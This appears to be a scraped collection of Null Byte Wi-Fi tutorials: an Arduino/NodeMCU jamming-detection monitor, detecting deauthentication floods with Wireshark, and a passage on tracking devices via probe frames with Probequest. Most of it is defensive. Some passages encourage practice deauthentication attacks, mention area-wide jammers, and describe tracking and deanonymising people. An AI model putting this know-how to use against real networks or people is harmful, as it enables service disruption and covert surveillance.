functions, red(), green(), and blue() one after another to test our blinking LED's.\ndelay(100); // The last thing we do is add a delay to create a pause between the blinking of our lights, in miliseconds.\nLet's break this down to understand what it's doing.\nIn a basic Arduino program, there are a few main elements. First, we have variables and libraries we're including; This will control the resulting code by allowing us to change things like how long the LEDs blink for.\nWe'll start by creating two variables to determine how long a blink should be, by defining how long to turn on and off the LED each time we activate it. We'll create the variable highTime to store how long in milliseconds to leave the LED on, and lowTime for how long to leave the LED off per blink.\nint highTime = 1000, lowTime = 100; // First, we define how long the light should be on (highTime) and how long the light should be off (lowTime) per blink in miliseconds (1000 = 1 sec)\nNext, we'll create and define three functions we can call each time we want to blink the LED a particular color. These will need to be \"void\" functions because unlike a regular function that returns data, these functions do something without returning any result.\n* Don't Miss: Detect Script-Kiddie Wi-Fi Jamming with Wireshark\nTo blink the red LED, we create a red() function, and then inside the curly braces, use the built-in digitalWrite() function to turn a pin off and on.\nTo use the digitalWrite() function, you need to include the pin you want to call and the power setting to change the pin to between the parenthesis. If I want to supply power to pin D5, I would type digitalWrite(D5, HIGH), and to turn the same pin off, digitalWrite(D5, LOW); This would turn on and off whichever color LED pin is attached to D5.\nWith this logic, we can use the code below to map each color function to the correct pin, so that calling the function first turns on, and then turns off the LED color connected to that pin. If your colors don't match the pin number first time, you can switch the pin numbers in your code to match the way you wired it.\nvoid red() { // Next, we create a function for the color red. You can expariment or swap these after testing them. For now, we will map pin D5 to our function \"red\"\ndigitalWrite(D5, HIGH), delay(highTime), digitalWrite(D5, LOW), delay(lowTime);\nvoid green() { // We will repeat this process for the color green. As a note, these are \"void\" functions because unlike normal functions they don't return any data, they just do something.\ndigitalWrite(D6, HIGH), delay(highTime), digitalWrite(D6, LOW), delay(lowTime);\nvoid blue() { // Finally, we create a function for the color blue as well.\ndigitalWrite(D7, HIGH), delay(highTime), digitalWrite(D7, LOW), delay(lowTime);\nNext, we'll need to address the part of the program that only runs once, called the setup function; This is mandatory in Arduino programs. In ours, we will use the built-in pinMode(pin, mode) function to activate the pins we will be using, telling the function which pin to call and what mode to set on it. To set pins D5, D6, and D7 to OUTPUTmode, we will use the code below.\nvoid setup() {\npinMode(D5, OUTPUT), pinMode(D6, OUTPUT), pinMode(D7, OUTPUT);\nFinally, we have the loop section; This will run over and over again. In this section, we will call each of the color functions we wrote, and then add a delay at the end of each cycle in milliseconds; This should result in the NodeMCU lighting up each color in the LED one after the other.\nvoid loop() {\nred(),green(),blue();\ndelay(100);\nStep 5: Flash the Simple Program to the NodeMCU\nNow, we're ready to test! Connect your NodeMCU via a Micro-USB cable to your computer, if not already done, and make sure the pins of the LED are connected to the GRD, D5, D6, and D7 pins on the breadboard.\nCopy and paste the script at the start of Step 4 into a blank Arduino IDE sketch, and click on the \"Upload\" button on the top left that looks like an arrow, and the program will be written to the NodeMCU as seen below.\nAfter the program is finished loading, your NodeMCU should power on and begin blinking through the three colors in the order you programmed it to.\nIf you'd like to download my script to blink the lights directly, you can run the command below to download it from my GitHub repository. You can open the .INO file in the resulting folder in Arduino IDE to see the code.\ngit clone https://gitlab.com/skickar/NodeMCUWiFiLinkMonitor.git\ncd NodeMCUWiFiLinkMonitor\nStep 6: Write the Wi-Fi Checking Code\nIf the indicator light test worked, then we're ready to move on to our functional code. We'll need to add a few more variables to the beginning in order to make the Wi-Fi monitor work. We'll use the LED color functions to show three conditions.\nIn the first condition, the NodeMCU cannot ever connect to the access point (AP) successfully. This means that the password may be wrong, the AP may be down, or something may be wrong with the SSID and password. We'll make the light turn blue in this condition to warn us that way may need to troubleshoot our code.\n* Don't Miss: Track Wi-Fi Devices & Connect to Them Using Probequest\nTo make this work, we'll create a variable called \"connectSuccess\" and set the value to zero. This variable will keep track of whether we do manage to successfully connect to the target network. Once the value of connectSuccess is above zero, we can tell our program to blink the red LED instead of the blue LED when the connection fails to let us know that a previously possible connection is being blocked or is otherwise unavailable.\nTo start, we will need to add the \"ESP8266WiFi.h\" library to control the Wi-Fi card to our previous code. After that, we will need to create a variable to hold the SSID and password to the network you want to join. We'll create a variable to hold the current Wi-Fi status each time we run our loop, and then add our connectSuccess variable set to zero.\nconst char* ssid     = \"Control\"; // Next, we set the name of the network to monitor.\nconst char* password = \"testytest\"; // After that, we enter the password of the network to monitor.\nint wifiStatus; // Here, we create a variable to check the status of the Wi-Fi connection.\nint connectSuccess = 0, highTime = 100, lowtime = 100; // And now, we set a variable to count the number of times we've been able to successfully connect, and how long the LED will stay on and off for.\nvoid red() { // Here, we will map a function called \"red\" to the right pin that will light up the red LED for the amount of time we defined in hightTime for how long it is lit, and lowTime for how long it is off each time we pulse a red LED.\ndigitalWrite(D5, HIGH), delay(highTime), digitalWrite(D5, LOW), delay(lowtime);  // We map the red function to the D5 pin, so that each time we call red() it will pulse power on the D5 pin.\nvoid green() { // We do the same with green, mapping the D6 pin to the green() function.\ndigitalWrite(D6, HIGH), delay(highTime), digitalWrite(D6, LOW), delay(lowtime);\nvoid blue() { // Finally, we do the same with blue, mapping it to the D7 pin.\ndigitalWrite(D7, HIGH), delay(highTime), digitalWrite(D7, LOW), delay(lowtime);\nNow, inside the setup loop, we'll call the WiFi.begin(ssid, password) function to attempt to connect to the wireless network. We'll include everything that was present in our LED program before as well.\nvoid setup() { // The setup function runs only once when the device starts up.\npinMode(D5, OUTPUT), pinMode(D6, OUTPUT), pinMode(D7, OUTPUT); // In this case, we will activate the D5, D6, and D7 pins for output mode.\nWiFi.begin(ssid, password); // The last part of setup we will write is to start the Wi-Fi connection process.\nNext, we'll add some new logic to the loop() function.\nFirst, we'll check the Wi-Fi status and write the result to the variable we created called wifiStatus. Next, we'll check to see if we've successfully connected previously by checking if the value of connectSuccess is more then zero. If the value is still zero, we will blink the blue LED by calling the blue() function to tell the user that we have yet to make a successful connection to the target AP.\nNext, we check to see if the value of wifiStatus is equal to WL_CONNECTED. If it is, we will turn on the green LED with the green() function and increase the value of the connectSuccess counter variable by one by typing connectSuccess ++. From now on, if the connection fails, it will activate the red LED rather than the blue LED because the value of connectSuccess is more than zero.\nFinally, if the value of wifiStatus is something other than WL_CONNECTED and the value of connectSuccess is not zero, we will turn on the red LED by calling the red() function. After we're done with the logic, we can add a final command to create a delay of 1 second between each check of the Wi-Fi status.\nvoid loop() { // This loop will run over and over again, unlike the setup function, which will only run once.\nwifiStatus = WiFi.status(); // First, we'll check the status of the Wi-Fi connection and store the result in the variable we created, wifiStatus.\nif(connectSuccess == 0){ blue();} // If device is not connected and never has successfully connected, flash the blue light. This could mean the network doesn't exist, is out of range, or you misspelled the SSID or password.\nif(wifiStatus == WL_CONNECTED){ green(), connectSuccess ++;} // If the device is connected, flash the green light, and add one to the count of the \"connectSuccess\" variable. This way, we will know to flash the red light if we lose the connection.\nelse if(connectSuccess != 0){ red(); } // If the connection is not active but we have been able to connect before, flash the red LED. That means the AP is down, a jamming attack is in progress, or a normal link is otherwise impossible.\ndelay(1000); // Set a delay of one second per cycle of checking the status of the link.\nOur final code will look like the example below.\n// SIMPLE Wi-FI LINK MONITOR BY SKICKAR - Based on Henry's Bench Wi-Fi link checker\n// This project has the goal to connect an ioT device to a Wi-Fi network and monitor the ability to establish a normal wireless connection.\n// The project uses only three componants - A nodeMCU, a breadboard, and one RGB LED.\n#include <ESP8266WiFi.h> // First, we include the libraries we need to make this work on the ESP8266\nconst char* ssid     = \"Control\"; // Next, we set the name of the network to monitor.\nconst char* password = \"testytest\"; // After that, we enter the password of the network to monitor.\nint wifiStatus; // Here, we create a variable to check the status of the Wi-Fi connection.\nint connectSuccess = 0, highTime = 100, lowtime = 100; // And now, we set a variable to count the number of times we've been able to successfully connect, and how long the LED will stay on and off for.\nvoid red() { // Here, we will map a function called \"red\" to the right pin that will light up the red LED for the amount of time we defined in hightTime for how long it is lit, and lowTime for how long it is off each time we pulse a red LED.\ndigitalWrite(D5, HIGH), delay(highTime), digitalWrite(D5, LOW), delay(lowtime);  // We map the red function to the D5 pin, so that each time we call red() it will pulse power on the D5 pin.\nvoid green() { // We do the same with green, mapping the D6 pin to the green() function.\ndigitalWrite(D6, HIGH), delay(highTime), digitalWrite(D6, LOW), delay(lowtime);\nvoid blue() { // Finally, we do the same with blue, mapping it to the D7 pin.\ndigitalWrite(D7, HIGH), delay(highTime), digitalWrite(D7, LOW), delay(lowtime);\nvoid setup() { // The setup function runs only once when the device starts up.\npinMode(D5, OUTPUT), pinMode(D6, OUTPUT), pinMode(D7, OUTPUT); // In this case, we will activate the D5, D6, and D7 pins for output mode.\nWiFi.begin(ssid, password); // The last part of setup we will write is to start the Wi-Fi connection process.\nvoid loop() { // This loop will run over and over again, unlike the setup function, which will only run once.\nwifiStatus = WiFi.status(); // First, we'll check the status of the Wi-Fi connection and store the result in the variable we created, wifiStatus.\nif(connectSuccess == 0){ blue();} // If device is not connected and never has successfully connected, flash the blue light. This could mean the network doesn't exist, is out of range, or you misspelled the SSID or password.\nif(wifiStatus == WL_CONNECTED){ green(), connectSuccess ++;} // If the device is connected, flash the green light, and add one to the count of the \"connectSuccess\" variable. This way, we will know to flash the red light if we lose the connection.\nelse if(connectSuccess != 0){ red(); } // If the connection is not active but we have been able to connect before, flash the red LED. That means the AP is down, a jamming attack is in progress, or a normal link is otherwise impossible.\ndelay(1000); // Set a delay of one second per cycle of checking the status of the link.\nYou can also find this code in the same GitHub repo the blinking .INO file was downloaded from.\nStep 7: Run the Code & Testing\nWith this complete, upload your code to the NodeMCU in the Arduino IDE and then wait for it to finish rebooting. Now it's time to test the device.\nThe best way to do so is to use your phone's wireless hotspot. Set the SSID and password in your program to that of your hotspot to easily test if the program works. To start, boot the NodeMCU with your hotspot off, and it should blink blue while unable to connect. When you turn on your Wi-Fi hotspot, it should blink green, and when you turn the hotspot off again, it should blink red.\nIf you don't have a phone with a hotspot, you can test it on your network too. Using one of our guides on MDK3 or Aireplay-ng, connect the NodeMCU to a network you have permission to test on, and attack the NodeMCU (or the channel if you have permission to) with a deauthentication or disassociation attack.\nYou should see the LED turn red as soon as your attack becomes effective, then turn green again when the attack subsides. You can use the NodeMCU as a \"victim\" device to practice jamming and deauthentication attacks with an easy LED indicator to show when you succeed.\nAmazing Projects Are Possible with the ESP8266 & Arduino IDE\nArmed with a low-cost board and Arduino IDE, we've created a simple code to monitor a network connection and shown how easy it is to automate a small, useful function with an IoT device. Aside from detecting attacks, the ESP8266 can also attack networks and has been used in projects ranging in variety from controlling intricate LED masks to small deauthentication packet generators like the esp8266 deauther by Spacehuhn.\nWith so many low-cost building blocks like the NodeMCU available that come with Wi-Fi built-in, connecting these devices to a network to do basic useful functions is simple even for a beginning maker. More advanced and creative uses of these building blocks can allow networks of targeted Wi-Fi protocol jammers to be distributed to deny coverage over a wide area, or detectors to automate Wi-Fi surveillance.\nI hope you enjoyed this guide to detecting Wi-Fi jamming attacks by programming a NodeMCU in Arduino IDE. If you have any questions about this tutorial on Arduino programming or you have a comment, feel free to reach me on Twitter @KodyKinzie or comment below.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Detect Script-Kiddie Wi-Fi Jamming with Wireshark",
        "link": "https://null-byte.wonderhowto.com/how-to/detect-script-kiddie-wi-fi-jamming-with-wireshark-0186138/",
        "content": "* WonderHowTo\nDue to weaknesses in the way Wi-Fi works, it's extremely easy to disrupt most Wi-Fi networks using tools that forge deauthentication packets. The ease with which these common tools can jam networks is only matched by how simple they are to detect for anyone listening for them. We'll use Wireshark to discover a Wi-Fi attack in progress and determine which tool the attacker is using.\nHow Script Kiddies Kill Networks\nMost denial-of-service (DOS) attacks are pretty basic and take advantage of well-documented flaws in the way WPA networks manage connections. Because the management packets that devices use to control these connections are unencrypted, it's easy for an attacker to craft fake ones after sniffing the wireless channels nearby. Tools to do this are free, widespread, and well-documented on the internet, all perfect for script kiddies.\nMost common scripts like Aireplay-ng or MDK3 do this by flooding a target with deauthentication or disassociation packets, which are both normal-seeming packets which have a disruptive effect on the network. Doing so requires only a wireless network adapter which can be put into monitor mode, and a simple command can take out an entire channel with many networks operating on it for up to a block without any specialized equipment.\n* Don't Miss: Disable Security Cams on Any Wireless Network with Aireplay-ng\nDetecting Common Wi-Fi DOS Attacks\nWhile these script-kiddie attacks can be very disruptive, they can also be detected by a variety of free and open-source tools. Software like Wireshark can be quite overwhelming for a beginner, especially without knowing what you're looking for in the flood of information available. To get started detecting these attacks, we'll be using Wireshark to sniff packets in the area and separate the types of packets we're interested in with filtering.\n* Don't Miss: Use Kismet to Watch Wi-Fi User Activity Through Walls\nOther tools for detection can also identify these attacks in progress. Kismet provides an alert for such attacks under the \"Alerts\" section, as well as providing alerts for other types of frequent attacks. While Kismet doesn't offer as much information as Wireshark, it's also a great way to get visibility of any attacks going on in your area.\nUsing Wireshark for Packet Sniffing\nIn this example, we'll be using Wireshark to detect Wi-Fi jamming attacks from nearby script kiddies. Wireshark can quickly get overwhelming with the amount of information it displays, so we'll need to filter this down to make it useful. As you can see from below, even with some coloring rules, a normally functioning Wi-Fi channel has a tremendous amount of information flying around. To make sense of it, we'll need to organize and filter it.\nClick or tap on the image to enlarge.\nWhile scanning, Wireshark will not control your wireless network adapter, so you'll need to use another program to set the channel (or to scan through channels). Once you set the channel to a network you want to scan, Wireshark will display all the packets captured on the channel, including other access points (APs) operating on the same channel. To sort through these, we'll use a few custom options in Wireshark.\nWireshark Custom Options\nWireshark comes with a number of ways to filter what we're seeing to be more relevant. The first is by simply dropping packets that aren't relevant to what we're looking for. This can be packets from another AP or just data packets we have no reason to save. By not saving these packets in the first place, you can reduce the size of your capture file and avoid seeing the distracting and irrelevant information.\nThe next way we can organize information is to tag interesting packets with color codes. This will make packets with specific rules we designate as important stand out more visibly. We can also instantly tell the difference between someone using a program that utilizes deauthentication packets exclusively versus a mix of deauthentication and disassociation, as in MDK3.\nThe last way we'll organize our view in Wireshark is with display filters. With these, we can choose which packets from our capture will show up and which will be hidden. This can allow us to be even more specific in our search, while still making sure the packets are in the capture file and available for analysis.\nWhat You'll Need\nWireshark is a fantastic program because it's well-supported. It's available for Window, macOS, and Linux, and it's capable of sniffing a variety of packet types. While we'll be using Wireshark to sniff Wi-Fi packets, it can also be used to sniff Bluetooth and Ethernet packets as well.\nI'll be doing this project in Kali Linux, which is recommended because it makes it very easy to change the channel your card is scanning on using a tool like Airodump-ng. You can run Kali in a virtual machine or from a bootable USB stick, but it's not strictly necessary to be using Kali to run this project.\n* Don't Miss: Bypass Locked Windows PCs to Run Kali Linux from a Live USB\nYou can detect attacks against your W-Fi network without putting your card into monitor mode, but you'll see far more packets by using a card that supports this. Many wireless cards are supported by Wireshark, so you should try your internal one before you use a separate adapter for this project. If your card does not support monitor mode, you can check out our list of adapters that do below.\nTo download Wireshark, you can navigate to the official website and grab an image from the download page. Follow the command prompts to install Wireshark, and once the installation is complete, we can start with our first Wireshark capture.\nStep 1: Prepare Your Network Card\nFirst, we'll need to set our wireless card to the correct channel we want to monitor. On Kali Linux, we can do this with the following commands, after initially running ifconfig or ip a to find the name of our network interface.\nairmon-ng start NameOfYourWirelessCard\nairodump-ng NameOfNetworkAdapter\nIf you're not sure what channel you want to be on, Airodump-ng will switch the card between different channels to scan everything. This has the disadvantage of causing many packets to be \"fragmented\" as the card is hopping between different networks. For best results, you should set the channel to that of the network you want to test.\nAirodump-ng will display all networks it sees. If you want to tune to a specific channel when you find a network you're interested in, you can press Ctrl-C to stop the command and add -c ItsChannelNumber to the end of the previous Airodump-ng to lock the card to the desired channel.\nOnce this is done, our card will be on the correct channel and scanning in wireless monitor mode. With this complete, we can open Wireshark and start applying capture filters for our investigation.\nStep 2: Capture Filters in Wireshark\nWhen you first open Wireshark, you'll see the menu below. First, select the adapter you'll be using to capture. In our example, we're using en0. Next, you'll see a field marked \"Capture\" which is where we can enter capture filters.\nWe'll want to include some capture filters to ensure we're dropping packets which aren't relevant or interesting to us. To keep our capture to packets pertinent to us, we can specify the following packet filter.\nwlan type data or wlan type mgt and (subtype deauth or subtype disassoc)\nThis specifies that we only want to keep wireless LAN packets that are data or management-type packets. Additionally, we want those packets to be either deauthentication or disassociation packets. You can play around with this syntax to develop your own filters. If you want to see more filters you can use, click the green icon next to where you entered the capture filter to see other commonly used filters saved by default.\nWhen your window looks like the picture above, double-click on the interface you want to launch or press return to start the Wireshark capture.\nStep 3: Display Filtering, Which Is Different for Some Reason\nSince we're looking for two types of packets, we can set two coloring rules to make them pop out immediately when we see them. Without this, it may be hard to tell at a glance what's happening when packets are rapidly being added to the list. Click on \"View\" in the menu bar, then select \"Coloring Rules\" from the drop-down.\nThis will lead you to a list of color rules. You can create your own by clicking the plus (+) button in the lower left side. Once there, you can enter a display filter, then a name for the filter in each row.\nTo change colors, you can click the \"Foreground\" or \"Background\" buttons to select the color. I made mine orange to highlight the packets we're looking for.\nThe filters we will be using will be green for data packets, orange for deauthentication packets, and yellow for disassociation packets. We can set these by setting the following values.\nData flow - data\nDeauth: Airmon or MDK3 - wlan.fc.type_subtype == 0x00c\nDisassoc: Airmon or MDK3 - wlan.fc.type_subtype == 0x00a\nThis will set the filter to separate the packets we're looking for by the type of tool that makes them.\nWith this complete, make sure the new color rules are selected with a checkmark, and click \"OK\" to save the changes.\nOnce in the main window, we can type the following display filter into the main display filter bar. You'll notice it has an entirely different syntax from the capture filter. In this case, we identify the packets by their wireless frame subtype and also allow for data so we can see if connections are being choked.\ndata || wlan.fc.type_subtype == 0x00c || wlan.fc.type_subtype == 0x00a\nAfter typing in that filter, we can apply the display filter to all of our data by hitting return.\nStep 4: Classify Common Script-Kiddie Tools\nNow, time for a test. Using Aireplay-ng and MDK3 from earlier tutorials, target your own Wi-Fi network (or one you have permission to) and record the results. You should notice two different patterns of in the attacks, and as a defender, you'll be able to determine which program is running from the data Wireshark shows you.\n* Aireplay-ng: With Aireplay-ng, you should see nothing but yellow deauthentication attacks; This is the only option given in Aireplay-ng, and you can set a value to the number of packets to send in your attack to see how many you receive intact in Wireshark.\n* MDK3: A pattern of orange and yellow stripes make MDK3 stick out as distinct in its attack signature, peppering targets with combined deauthentication and disassociation frames. Training MDK3 on a target will result in choking of green data packets after bursts of yellow and orange packets flood the channel.\nWhile floods of these packets are positive signs of an attack in progress, sometimes these packets do occur under normal circumstances on networks, especially corporate networks capable of \"suppressing\" rogue access points. If you see a few lone disassociation packets or the occasional deauth, it may not be cause for alarm.\nStep 5: Set Custom Filters\nTo further refine your search, it's obvious how useful filters are. Rather than painfully learning every type of expression for the syntax allowed, Wireshark has a handy hacker way of setting anything as a display filter. Click on a packet from a network that you are interested in, and we'll use the information inside it to create a new display filter to only show packets transmitted from that device.\nOn the bottom pane, click the downward facing arrows to expand the information in the packet. If you want to filter for everything like that thing (or filter that thing out), right-click on it, then select \"Apply as Filter,\" followed by \"Selected.\"\nYou can also easily set colorized filters here, as well.\nNow, you can use this to make it so you only see transmissions to or from a particular MAC address. This is helpful for cutting through other devices that meet your display filter but still aren't relevant. To add anything to your filter, just type || after your last filter term, and add a new one. This means \"or,\" allowing you to add more conditions a filter will match.\nTo build more sophisticated filters, you can also combine them with && statements to make the following filter a requirement, or replace the == symbol with != to specify \"does not equal\" to filter out anything that does match that an undesirable value.\nWhile It's Easy to Disrupt a Network, It's Also Easy to Detect\nWireshark and other tools can be used to quickly get to the bottom of any suspected jamming. Because the tools to detect and localize jamming are free and available to anyone, hackers using tools like MDK3 and Aireplay-ng may be letting a network administrator know what you're doing, right down to the program you're using for the attack. This level of information is extremely useful for defenders, who can use it to create tools to automatically defend a network. Hackers, on the other hand, should keep in mind how many alarm bells they may trigger with such activities.\nThe vulnerabilities in current Wi-Fi around unprotected management frames will largely be corrected in the upcoming WPA3 standard, but current users don't need to wait to protect against these script-kiddie-style jamming attacks. Protected management frames have actually been available for some time in the 802.11w standard, but most devices have this disabled by default. If you're interested in protecting yourself from these kinds of attacks, you should look into requiring protected management frames in your router's firmware settings.\nI hope you enjoyed this guide to detecting Wi-Fi jamming programs like MDK3 and Aireplay-ng with Wireshark! If you have any questions about this tutorial on Wireshark or you have a comment, feel free to reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Track Wi-Fi Devices & Connect to Them Using Probequest",
        "link": "https://null-byte.wonderhowto.com/how-to/track-wi-fi-devices-connect-them-using-probequest-0186137/",
        "content": "* WonderHowTo\nWi-Fi devices are continually emitting \"probe frames,\" calling out for nearby Wi-Fi networks to connect to. Beyond being a privacy risk, probe frames can also be used to track or take over the data connection of nearby devices. We'll explain how to see nearby devices emitting probe frames using Probequest and what can be done with this information.\nIn order to function, Wi-Fi devices are always doing one of two things to try to discover available networks; They either send out beacon frames or probe frames.\nHow Beacon Frames Work\nWi-Fi access points (APs) emit packets called beacon frames which contain information about the access point they are advertising. This information allows nearby devices to be aware that the access point exists and to decide whether or not the network has been connected to before. If the network is recognized by a device, the device will attempt to connect to the network.\nBy opening a beacon frame in Wireshark, we can see that they contain information about the device that transmitted the packet, the Wi-Fi network the beacon frame is advertising, and information about what channel the AP is operating on and what speeds that the network supports. This is how your phone and laptop can offer you a list of networks nearby seemingly out of thin air, as your device will detect these packets and provide the user the ability to connect if they want to.\nIn Wireshark, a beacon frame looks like this:\nHow Probe Frames Work\nThe second way a Wi-Fi connection happens is when your device attempts to find a nearby network to connect to by sending out a kind of packet called a probe frame.\nProbe frames function in almost the opposite way of beacon frames. The client device will send out packets searching for Wi-Fi networks to which it has recently been connected. This allows you to quickly and seamlessly reconnect to networks like your home or work network if you are disconnected or momentarily wander out of the coverage of the network.\nIn Wireshark, we can look at a probe frame to discover information about the device sending the packet, as well as the name and channel number of the access point it is calling for. You can see the following probe frames transmitted on a subway train:\nDevices like laptops and smartphones will send out probe frames on all channels even when the Wi-Fi is turned off. This is because Wi-Fi-assisted geolocation is turned on by default and is not affected by the Wi-Fi connection option being turned off. So, in general, turning off your smartphone's Wi-Fi alone will not prevent the device from sending probe frames.\nWhat Probe Frames Can Show\nThis practice has attracted attention from security researchers like Mathy Vanhoef, who showed that probe frames can be used to track users with a high degree of precision and that even attempts to prevent this (like randomizing the MAC address used in probe frames sent by client devices) is not very useful in preventing tracking. Mathy's work has uncovered many ways of reading into the information contained in probe frames, including multiple ways of revealing a nearby device's real MAC address.\nMAC address randomization is often done in ways that are not consistent or genuinely random enough to be effective, including sending the device's real MAC address in response to any beacon frame the device recognized, including ESSID's like \"Google Starbucks.\" This means most people walking by a coffee shop with free Wi-Fi they've used before are momentarily de-cloaked while they are within range.\n* Don't Miss: Build a Pumpkin Pi — The Rogue AP & MITM Framework\nAside from bad MAC address randomization, the information elements contained in probe frames include information that is often enough to create a fingerprint for tracking a device. This is because many devices do not follow the Wi-Fi standard exactly and arrange their elements slightly differently. The elements can be in different order or may contain some vendor-specific information.\nBecause the data in the information elements contained in the probe frame, as well as the incremental sequence number of the packets being sent, can be used to zero in on specific devices, probe frames provide arguably the cheapest way to automatically spy on targets both from a distance and up close. By using tools like Wigle Wi-Fi, we can also look for the physical address a target device has been to recently by inputting the ESSID we see in probe frames into the search to see if we can find a matching access point in our area.\n* Don't Miss: Wardrive on an Android Phone to Map Vulnerable Networks\nTracking Wi-Fi Devices via Probe Frames\nUsing probe frames and the ability to decloak or track users, we can learn a lot of information. Besides being able to detect intruders in areas they're not supposed to be, we're also able to monitor human activity and keep track of when people come and go. We can see what networks people have permission to connect to, and with multiple Wi-Fi sensors, we can track their movement in real time. Major retailers use this practice to monitor customer traffic flow through stores, using it to sell the retail space customers spend the most time to manufacturers at a premium.\nBecause probe frames are essentially a device sending an identifiable ping at regular intervals, you can track devices with a directional antenna with high precision. Because Wi-Fi has a line of sight range, a directional antenna can observe activity in a location a mile away to determine who is home and what devices are present without being anywhere near the area.\nCombined with a system like a license plate or facial recognition scanner, probe frames could allow a hacker to tie your cell phone to your face or vehicle just by setting up a camera and a directional antenna.\n* Don't Miss: Use Kismet to Watch Wi-Fi User Activity Through Walls\nThe ability to track a target via their smartphone or laptop allows for hackers to design attacks that act intelligently, reacting to the presence of a target's devices by performing a malicious action like jamming one person's machine from being able to join nearby networks. Also, an attacker can use the information contained in probe frames to construct an attack to take over the data connection on a target's device.\nTaking Over Data Connections Using Observed ESSID's\nBy listening in on probe frames, an attacker can attempt to take over the data connection of the target device by taking advantage of the information contained in probe frames. While many devices will no longer put the ESSID of the network they're looking for into their probe frames, there is a sizable percentage that either still does all the time or will under certain circumstances.\nWhat You'll Need for This Guide\nTo get started using Probequest, you'll need to have a network adapter that can be put into monitor mode. This will allow you to hear transmissions from channels and networks other than the one your device is trying to connect to. If your laptop's card isn't compatible, you can check out our list of compatible network adapters.\nProbequest installs with pip, so you'll need to have Python installed as well. If you're running Kali Linux, make sure to update and upgrade your system before starting by typing the following into a terminal window.\napt upgrade\nStep 1: Install Probequest\nInstallation of Probequest is very straightforward. In a new terminal window, type the following to install Probequest. If you get an error saying you don't have pip3, you can install it by typing apt install python3-pip into the terminal window, then try the command below again.\nsudo pip3 install --upgrade probequest\nCollecting probequest\nDownloading https://files.pythonhosted.org/packages/93/6f/aaaf91f35eb7082c03e17a543df0646ae71620b6a579d40aef19b6d09aea/probequest-0.6.1.tar.gz\nCollecting argparse>=1.4.0 (from probequest)\nDownloading https://files.pythonhosted.org/packages/f2/94/3af39d34be01a24a6e65433d19e107099374224905f1e0cc6bbe1fd22a2f/argparse-1.4.0-py2.py3-none-any.whl\nCollecting netaddr>=0.7.19 (from probequest)\nDownloading https://files.pythonhosted.org/packages/ba/97/ce14451a9fd7bdb5a397abf99b24a1a6bb7a1a440b019bebd2e9a0dbec74/netaddr-0.7.19-py2.py3-none-any.whl (1.6MB)\n100% |████████████████████████████████| 1.6MB 718kB/s\nCollecting scapy>=2.4.0 (from probequest)\nDownloading https://files.pythonhosted.org/packages/68/01/b9943984447e7ea6f8948e90c1729b78161c2bb3eef908430638ec3f7296/scapy-2.4.0.tar.gz (3.1MB)\n100% |████████████████████████████████| 3.1MB 468kB/s\nRequirement already up-to-date: urwid>=2.0.1 in /usr/lib/python3/dist-packages (from probequest)\nBuilding wheels for collected packages: probequest, scapy\nRunning setup.py bdist_wheel for probequest ... done\nStored in directory: /root/.cache/pip/wheels/0e/8a/6e/39dc49dd1f36136060c4b65edd8e6b33350498ca742f113073\nRunning setup.py bdist_wheel for scapy ... done\nStored in directory: /root/.cache/pip/wheels/cf/03/88/296bf69fee1f9ec7a87e122da52253b65f3067f6ea8719b473\nSuccessfully built probequest scapy\nInstalling collected packages: argparse, netaddr, scapy, probequest\nSuccessfully installed argparse-1.4.0 netaddr-0.7.19 probequest-0.6.1 scapy-2.4.0\nYou can also try installing the program from GitHub with the following commands.\ngit clone https://github.com/SkypLabs/probequest.git\ncd probequest\nsudo pip3 install --upgrade\nStep 2: Put Adapter into Monitor Mode\nNext, we'll need to locate and put our wireless adapter into monitor mode. To do this, we'll open a terminal window and use ifconfig to give you the name of the network adapters that are connected. In Kali Linux, yours should be something like \"wlan0.\"\nWith the adapter name known, we can then use Airmon-ng, making the final command to type airmon-ng start wlan0 to start the adapter in monitor mode. This will also change the name of the adapter, so run ifconfig again to check the new name. It should be something like \"wlan0mon\" in Kali.\nairmon-ng start wlan0\nFound 3 processes that could cause trouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to run 'airmon-ng check kill'\n508 NetworkManager\n607 wpa_supplicant\n8250 dhclient\nPHY     Interface   Driver      Chipset\nphy0    wlan0       ath9k       Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01)\n(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n(mac80211 station mode vif disabled for [phy0]wlan0)\nStep 3: Observe Nearby Devices\nOnce Probequest is installed and our card is in monitor mode, we can type probequest in a terminal window to see the primary commands.\nusage: probequest [-h] [--debug] -i INTERFACE [--ignore-case]\n[--mode {RAW,TUI}] [-o OUTPUT] [--version]\n[-e ESSID [ESSID ...] | -r REGEX]\n[--exclude EXCLUDE [EXCLUDE ...] | -s STATION [STATION ...]]\nThe most basic command we can pass to Probequest to start seeing probe frames is as follows:\nprobequest -i wlan0mon\nWith this simple command, Probequest will start listening in on the current channel. As you'll notice in the output, the information is also checked against a definition list to determine the manufacturer of the devices transmitting nearby.\n[*] Start sniffing probe requests...\nMon, 23 Jul 2018 04:06:38 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:06:38 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:06:39 PDT - xxxxxxxxxxxxxxxxx (Apple, Inc.) -> CrossCamp.us Staff\nBased on the information we see, the identity of systems operating nearby should become clear. Expect to see brands that are printers, cell phones, IoT devices like Sonos and Nest Cams, and other nearby devices.\n[*] Start sniffing probe requests...\nMon, 23 Jul 2018 04:06:38 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:06:38 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:06:39 PDT - xxxxxxxxxxxxxxxxx (Apple, Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:06:44 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:06:44 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:06:49 PDT - xxxxxxxxxxxxxxxxx (Nest Labs Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:06:49 PDT - xxxxxxxxxxxxxxxxx (Nest Labs Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:06:49 